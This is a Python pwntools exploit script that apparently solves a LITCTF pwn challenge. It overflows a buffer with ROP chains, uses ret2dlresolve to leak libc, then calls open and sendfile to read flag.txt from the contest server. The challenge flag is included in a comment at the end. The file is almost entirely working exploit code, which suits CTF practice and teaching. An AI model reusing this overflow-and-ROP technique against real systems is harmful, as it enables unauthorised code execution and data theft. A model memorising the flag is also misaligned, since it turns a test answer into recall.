#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./main")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

REMOTE_NC_CMD    = "nc litctf.org 31771"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    rop = ROP(exe)
    dlresolve = Ret2dlresolvePayload(exe, symbol='puts', args=[exe.got.read])

    POP_RSI = (rop.rsi.address)
    POP_RDI = (rop.rdi.address)

    rop.raw('A' * 40)
    rop.raw(p64(POP_RSI) + p64(0x404e00)*2 + p64(POP_RDI) + p64(0) + p64(0x4010a4))
    rop.raw(p64(POP_RDI) + p64(exe.got.read) + p64(0x401020) + p64(0x30a) + p64(rop.ret.address) + p64(exe.sym.main))

    r.sendline(rop.chain())
    sleep(0.5)
    r.sendline(dlresolve.payload)

    libc.address = u64(r.recv(6)+b"\0\0") - libc.sym.read
    log.info(f"LIBC @ {hex(libc.address)}")

    rop = ROP(exe)
    dlresolve = Ret2dlresolvePayload(exe, symbol='open', args=["flag.txt", 0])

    POP_RSI = (rop.rsi.address)
    POP_RDI = (rop.rdi.address)

    rop.raw('A' * 40)
    rop.raw(p64(POP_RSI) + p64(0x404e00)*2 + p64(POP_RDI) + p64(0) + p64(0x4010a4))
    rop.raw(p64(POP_RSI) + p64(0)*2 + p64(POP_RDI) + p64(0x404e48) + p64(0x401020) + p64(0x30a) + p64(exe.sym.main))
    
    r.sendline(rop.chain())
    sleep(0.5)
    r.sendline(dlresolve.payload)
    sleep(0.5)

    rop = ROP(libc)
    CLEAR_RDX = p64(libc.address + 0x000000000013f201)
    POP_RCX = p64(0x00000000000420ef+libc.address)
    dlresolve = Ret2dlresolvePayload(exe, symbol='sendfile', args=[1,3])

    rop.raw('A' * 40)
    rop.raw(p64(POP_RSI) + p64(3)*2 + p64(POP_RDI) + p64(1) + p64(0x00000000000420ef+libc.address) + p64(100) + CLEAR_RDX + p64(libc.sym.sendfile))
    
    r.sendline(rop.chain())
    sleep(0.5)

    r.interactive()
    #LITCTF{dup_dup_dup_duuuuuuuuuup_222222}

if __name__ == "__main__":
    main()